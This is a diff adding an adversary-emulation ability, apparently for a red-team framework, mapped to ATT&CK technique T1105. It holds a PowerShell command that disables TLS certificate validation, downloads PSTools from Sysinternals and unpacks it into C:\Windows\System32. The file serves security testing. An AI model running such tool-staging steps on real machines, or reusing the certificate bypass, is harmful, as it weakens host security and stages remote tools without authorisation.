@@ -1,0 +1,18 @@
+---
+
+- id: eb814e03-811a-467a-bc6d-dcd453750fa2
+  name: Install PSTools
+  description: Download and install PSTools by unzipping the file
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  platforms:
+    windows:
+      psh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+          $web = (New-Object System.Net.WebClient);
+          $result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");
+          New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;
+          Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
